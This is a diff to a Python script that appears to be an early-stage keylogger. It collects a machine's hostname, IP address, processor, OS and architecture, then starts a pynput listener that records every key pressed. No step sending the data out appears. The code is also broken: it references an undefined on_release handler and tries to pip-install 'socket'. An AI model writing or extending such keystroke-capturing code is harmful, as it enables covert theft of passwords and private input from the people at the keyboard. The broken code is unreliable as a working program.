@@ -1,8 +1,10 @@
 #!/usr/bin/python3
 try:
     import subprocess
-    import keyboard
+    from pynput.keyboard import Listener
     import socket
+    import platform
+    USER_DATA = ""
 
 except ModuleNotFoundError:
     packages = ["keyboard","socket","pynput"]
@@ -13,17 +15,19 @@ except ModuleNotFoundError:
     
 
 finally:
-    def err_handler():
-        exit()
-    
-
-    USER_MAC = "" #Currently string could be int.
     USER_HOSTNAME = socket.gethostname()
     USER_IP = socket.gethostbyname(USER_HOSTNAME)
-    print(USER_HOSTNAME + '' + USER_IP)
-    def get_device_info(interface):#Specific interface required, perhaps scan for multiple if possible.
-        #try:
-            
-        #except:
-            #err_handler()
-        return interface
+    USER_PROCESSOR = platform.processor()
+    USER_SYSTEM = platform.system()
+    USER_MACHINE = platform.machine()
+    USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
+    print(USER_DATA)
+    def on_press(key):  # The function that's called when a key is pressed
+        print("Key pressed: {0}".format(key))
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:  # Create an instance of Listener
+        listener.join()  # Join the listener thread to the main thread to keep waiting for keys
+
+
+    
+
